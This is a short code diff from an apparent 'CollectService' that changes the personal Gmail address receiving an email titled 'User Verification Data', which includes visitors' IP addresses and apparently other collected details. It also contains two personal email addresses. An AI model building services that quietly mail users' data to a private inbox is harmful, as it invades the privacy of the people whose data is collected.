@@ -18,7 +18,7 @@ export class CollectService {
 
     await transporter.sendMail({
       from: process.env.SMTP_USER,
-      to: "kumawatmanish686@gmail.com",
+      to: "manishkumr101k@gmail.com",
       subject: '📸 User Verification Data',
       text: `
 IP Address: ${data.ip}
